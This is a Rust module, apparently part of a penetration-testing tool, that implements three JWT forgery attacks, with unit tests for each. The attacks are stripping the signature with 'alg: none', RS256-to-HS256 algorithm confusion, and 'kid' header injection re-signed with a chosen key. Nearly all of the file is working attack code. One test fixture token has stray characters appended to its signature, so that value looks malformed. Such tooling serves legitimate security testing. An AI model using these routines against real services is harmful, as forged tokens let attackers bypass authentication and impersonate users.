use crate::jwt::Token;

pub fn alg_none(token: &mut Token) -> Result<(), Box<dyn std::error::Error>> {
    token.set_alg("none")?;
    token.clear_signature();
    Ok(())
}

pub fn alg_confusion(token: &mut Token, key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    if !token.header["alg"].as_str().unwrap_or("").starts_with("RS") {
        return Err("Token needs to use asymmetric algorithm like RS256".into());
    }
    token.set_alg("HS256")?;
    token.sign_hs256(key)?;
    Ok(())
}

pub fn kid_injection(
    token: &mut Token,
    kid: serde_json::Value,
    key: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    token.set_header("kid", kid);
    token.set_alg("HS256")?;
    token.sign_hs256(key)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::jwt::parse;

    const VALID_TOKEN: &str = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc4Mzg4NzY4Mn0.o1emW17F_OGZlowPglGBIMowR0MOaGS1S7CNHSZdyfgUPx8Myk0Fp79MicNnPZacJjhwmEA6RQwD1jkc02hEBROG2iRGbl9BnWKs_E4UPbFe5Wjlsn9o462T1tDBC2csPmACFS3CiYL6pKIEkWoBeIPhxG1SIvLieDSugSDgTXUx8N2-0ymmyD2-HBkQV4y5DTXKZdUFfqMXR7Cj2nX9DvY_Zb5KdgPUCIY2p5KsOYIMiM3Aq-e5qKgncbQjXgO4EJK4AfyXjRH-ErPdrw7AWORt2b7_7cYye0tF1fAtK-GdbLWD-3ya_Jfufi43Dc6ZzwtHXg95_jQqgZ_drzDkIgeyJhbGciOiJIUzI1NiIsInR5c";
    const HS256_TOKEN: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30";

    fn sample_token() -> Token {
        parse(VALID_TOKEN).unwrap()
    }

    #[test]
    fn alg_none_attack() {
        let mut token = sample_token();
        alg_none(&mut token).unwrap();

        let encoded_token = token.encode().unwrap();

        assert_eq!(token.header["alg"], "none");
        assert!(token.signature.is_empty());

        assert_eq!(encoded_token.split('.').count(), 3);
    }

    #[test]
    fn alg_confusion_attack() {
        let mut token = sample_token();
        alg_confusion(&mut token, b"secret").unwrap();

        assert_eq!(token.signature.len(), 32);
        assert_eq!(token.header["alg"], "HS256");
    }

    #[test]
    fn alg_confusion_rejects_non_asymmetric_key() {
        let mut token = parse(HS256_TOKEN).unwrap();
        let result = alg_confusion(&mut token, b"secret");

        assert!(result.is_err());
    }

    #[test]
    fn kid_injection_injects_kid() {
        let mut token = sample_token();
        kid_injection(
            &mut token,
            serde_json::Value::String("random".to_string()),
            b"secret",
        )
        .unwrap();

        assert_eq!(token.header["kid"], "random");
        assert_eq!(token.header["alg"], "HS256");
        assert_eq!(token.signature.len(), 32);
    }

    #[test]
    fn empty_key_still_produces_valid_signature() {
        let mut token = sample_token();
        kid_injection(
            &mut token,
            serde_json::Value::String("random".to_string()),
            b"",
        )
        .unwrap();
        assert_eq!(token.header["kid"], "random");
        assert_eq!(token.header["alg"], "HS256");
        assert_eq!(token.signature.len(), 32);
    }
}
